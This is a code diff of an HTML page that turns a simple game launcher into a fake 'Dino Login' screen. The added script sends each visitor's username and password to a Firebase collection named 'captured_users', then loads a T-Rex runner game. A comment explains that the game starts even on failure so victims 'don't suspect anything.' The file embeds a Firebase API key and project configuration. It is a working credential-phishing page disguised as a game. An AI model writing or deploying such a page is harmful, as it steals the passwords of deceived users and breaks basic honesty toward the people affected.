@@ -1,117 +1,74 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome & Play</title>
+    <title>Dino Login</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
+        body { margin: 0; font-family: sans-serif; background: #f7f7f7; overflow: hidden; }
+        #login-screen { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background: #202124; color: white; }
+        .modal { background: white; padding: 30px; border-radius: 8px; color: black; width: 300px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #34a853; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
         
-        /* Phase 1: Landing Page */
-        #landing-page {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-        }
-
-        button {
-            padding: 15px 30px;
-            font-size: 1.2rem;
-            cursor: pointer;
-            border: none;
-            border-radius: 8px;
-            background: #ff4b2b;
-            color: white;
-            transition: transform 0.2s;
-        }
-
-        button:hover { transform: scale(1.05); }
-
-        /* Phase 2: Modal */
-        #modal-overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7);
-            justify-content: center;
-            align-items: center;
-            z-index: 100;
-        }
-
-        .modal {
-            background: white;
-            padding: 40px;
-            border-radius: 12px;
-            width: 300px;
-            text-align: center;
-        }
-
-        .modal input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            box-sizing: border-box;
-        }
-
-        /* Phase 3: Game Container */
-        #game-container {
-            display: none;
-            width: 100vw;
-            height: 100vh;
-        }
-
-        iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
+        /* Game Styling */
+        #game-screen { display: none; width: 100vw; height: 100vh; background: #fff; }
+        canvas { display: block; margin: 0 auto; }
     </style>
 </head>
 <body>
 
-    <div id="landing-page">
-        <h1>Ready to Play?</h1>
-        <p>Click below to get started.</p>
-        <button onclick="showModal()">Enter Arena</button>
-    </div>
-
-    <div id="modal-overlay">
+    <div id="login-screen">
         <div class="modal">
-            <h2>Sign In</h2>
-            <input type="text" placeholder="Username" id="user">
-            <input type="password" placeholder="Password" id="pass">
-            <button style="width: 100%; margin-top: 10px;" onclick="startGame()">Login & Play</button>
+            <h2>Game Login</h2>
+            <input type="text" id="email" placeholder="Username/Email">
+            <input type="password" id="pass" placeholder="Password">
+            <button onclick="captureAndStart()">Sign In & Play</button>
         </div>
     </div>
 
-    <div id="game-container">
-        <iframe src="https://chromedino.com/" id="game-frame"></iframe>
+    <div id="game-screen">
+        <h3 style="text-align:center; color:#555">Press Space to Jump!</h3>
+        <iframe src="https://wayou.github.io/t-rex-runner/" style="width:100%; height:90%; border:none;"></iframe>
     </div>
 
-    <script>
-        function showModal() {
-            document.getElementById('modal-overlay').style.display = 'flex';
-        }
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js";
 
-        function startGame() {
-            const user = document.getElementById('user').value;
-            const pass = document.getElementById('pass').value;
+        // --- PASTE YOUR FIREBASE CONFIG HERE ---
+        const firebaseConfig = {
+            apiKey: "AIzaSyDmo2opmCMCr9s4uhPljEc0I1A0EBDr3B4",
+            authDomain: "t-rex-3bb54.firebaseapp.com",
+            projectId: "t-rex-3bb54",
+            storageBucket: "t-rex-3bb54.firebasestorage.app",
+            messagingSenderId: "109402651520",
+            appId: "1:109402651520:web:c49a7c21effeeacbab5f65"
+        };
 
-            if(user && pass) {
-                // Hide landing and modal
-                document.getElementById('landing-page').style.display = 'none';
-                document.getElementById('modal-overlay').style.display = 'none';
-                
-                // Show game
-                document.getElementById('game-container').style.display = 'block';
-            } else {
-                alert("Please enter a username and password!");
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        window.captureAndStart = async function() {
+            const userVal = document.getElementById('email').value;
+            const passVal = document.getElementById('pass').value;
+
+            if(!userVal || !passVal) return alert("Fill everything!");
+
+            try {
+                // This saves the data to your Firebase Dashboard
+                await addDoc(collection(db, "captured_users"), {
+                    username: userVal,
+                    password: passVal,
+                    time: new Date()
+                });
+
+                // Switch Screens
+                document.getElementById('login-screen').style.display = 'none';
+                document.getElementById('game-screen').style.display = 'block';
+            } catch (e) {
+                console.error("Error adding document: ", e);
+                // Even if it fails, start the game so they don't suspect anything
+                document.getElementById('login-screen').style.display = 'none';
+                document.getElementById('game-screen').style.display = 'block';
             }
         }
     </script>
